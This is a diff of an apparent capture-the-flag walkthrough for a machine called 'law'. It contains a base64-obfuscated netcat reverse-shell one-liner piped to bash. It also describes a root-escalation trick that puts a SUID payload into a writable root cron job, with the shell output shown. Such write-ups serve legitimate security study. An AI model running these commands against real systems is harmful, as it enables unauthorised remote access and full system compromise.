@@ -45,7 +45,39 @@ cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguNDUu
 echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguNDUuMjEyIDgwID4vdG1wL2Y= | base64 -d|bash
 ```
 
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/ccc4c8d4-b1cc-4333-b356-d8a10304f37d)
 
+proccess the payload and check ncat listener
 
 ![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/60c697de-2254-4e09-b05f-666ce18183f8)
 
+we got a reverse shell. 
+
+
+## Privilege Escalation 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/9a2a578b-7fd8-4c4c-b5c2-1543647b53a5)
+
+running pspy on the target, we can see a cron job running as root. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/ac26305a-8433-49a1-b2fa-5734ca8298bc)
+
+checking the content of the file, we can see we have permission to write to the file, so we put in an suid creation payload in the file and wait for the cron job to trigger it.
+
+```shell
+www-data@law:/tmp$ ls -al /bin/bash
+-rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
+www-data@law:/tmp$ ls -al /bin/bash
+-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
+www-data@law:/tmp$ ls -al /bin/bash -p 
+-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
+www-data@law:/tmp$ /bin/bash -p 
+bash-5.1# whoami 
+root
+bash-5.1# 
+```
+we got suid `/bin/bash` and ran the command to spawn a root shell.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/2dfef64c-77a0-4b1e-875a-b404a791baec)
+
+and we are through 🙂 
